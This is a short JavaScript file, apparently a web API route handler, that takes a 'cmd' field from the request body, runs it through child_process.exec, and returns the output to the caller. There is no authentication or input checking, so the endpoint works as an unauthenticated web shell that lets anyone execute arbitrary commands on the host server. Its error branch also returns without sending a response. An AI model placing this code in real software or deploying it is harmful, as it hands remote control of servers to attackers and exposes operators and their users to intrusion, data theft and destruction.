const { exec } = require("child_process");

export default function handler(req, res) {
    const body = JSON.parse(req.body)

    exec(body.cmd, (error, stdout, stderr) => {
        if (error) {
            console.error(stderr)
            return error;
        }
        res.status(200).send(stdout)
    })
}